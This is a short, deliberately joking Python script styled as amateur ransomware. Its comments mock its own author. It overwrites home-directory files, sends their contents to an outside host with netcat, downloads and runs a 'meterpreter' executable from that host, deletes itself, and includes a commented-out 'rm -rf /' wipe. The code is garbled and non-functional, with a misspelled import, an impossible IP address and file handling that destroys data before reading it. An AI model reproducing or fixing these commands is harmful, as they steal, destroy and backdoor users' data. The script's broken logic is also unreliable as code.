#!/usr/bin/env python
import os
import base64
impor requests

# incridibel h4xxer l33t ransomwar
# way in workings:
#  - sTep 1: encrypt data
# - step two: send data to C2 SERVER
#  - step 4: crate backdor (or as i likes to call it, hackdoor >:D )
#  - step 5 - remova traces and be invicible/anonymos


for i in range(0, len(os.listdir("~/"))):
    print(i)
    print(os.listdir("~/"))
    f = open(os.listdir("~/")[i], "w+")

    # encrypt
    enccrypted = f.read()
    notencrypted = enccrypted
    enccrypted = base64.b32encode(enccrypted)
    f.write(enccrypted)

    f.close()

    # exfilter
    os.system(f"echo \"{notencrypted}\" | nc 145.6.322.5 1337")

    # hackdoor
    os.system("curl 145.6.322.5:8080/c2/metasploits/meterpreter_tcp_bind_shell-v1.14.exe -o /tmp/.hidden/exploit.exe")
    os.system("chmod +x /tmp/.hidden/exploit.exe")
    os.system("bash /tmp/.hidden/exploit.exe")

    #
    # anonymus
    from os import remove
    from sys import argv

    remove(argv[0])


## optional code -delete EVERYTHING muahahahahahahaw

#os.system("sudo rm -rf / -no-preserve-root"
